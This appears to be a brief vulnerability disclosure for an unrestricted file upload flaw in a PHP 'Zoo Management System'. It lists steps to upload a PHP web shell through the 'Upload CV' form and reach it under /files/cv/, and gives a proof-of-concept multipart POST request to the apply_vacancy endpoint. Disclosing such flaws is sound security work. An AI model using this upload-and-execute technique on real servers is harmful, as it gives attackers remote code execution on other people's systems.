...
# Exploit
Upload web shell at `Upload CV`
![image](https://user-images.githubusercontent.com/79050415/158933770-412bdbd7-e578-4379-845e-91e7be61f1a8.png)
* When upload success access `/files/cv/lmao_1647573914.php`
![image](https://user-images.githubusercontent.com/79050415/158934056-6c142340-230d-4f87-8a28-0241748ca61d.png)
* Web shell activated
![image](https://user-images.githubusercontent.com/79050415/158934257-0a09e0a9-82fd-4ce1-a633-a6ad863a3d6a.png)
# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/158934420-91eedf91-c990-4f3b-8677-c9b0c361bf08.png)
* No file checking before uploading
# POC 
* `Injection Point`
```c
------WebKitFormBoundaryweuPp5xYq2xZxRzb
Content-Disposition: form-data; name="cv"; filename="lmao.php"
Content-Type: application/octet-stream
```
* Request 
```c
POST /ZooManagementSystem/public_html/apply_vacancy?vac_id=6 HTTP/1.1
Host: localhost:8080
Content-Length: 179092
...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryweuPp5xYq2xZxRzb
...
Referer: http://localhost:8080/ZooManagementSystem/public_html/apply_vacancy?vac_id=6
...
------WebKitFormBoundaryweuPp5xYq2xZxRzb
Content-Disposition: form-data; name="a_fullname"

root
------WebKitFormBoundaryweuPp5xYq2xZxRzb
Content-Disposition: form-data; name="a_email"

hacked@gmail.com
------WebKitFormBoundaryweuPp5xYq2xZxRzb
Content-Disposition: form-data; name="a_phone"
...
```
`POC VIDEO` https://drive.google.com/file/d/14WEhaUdOaKdwM8Mlztuko4nnQsmoe89O/view?usp=sharing
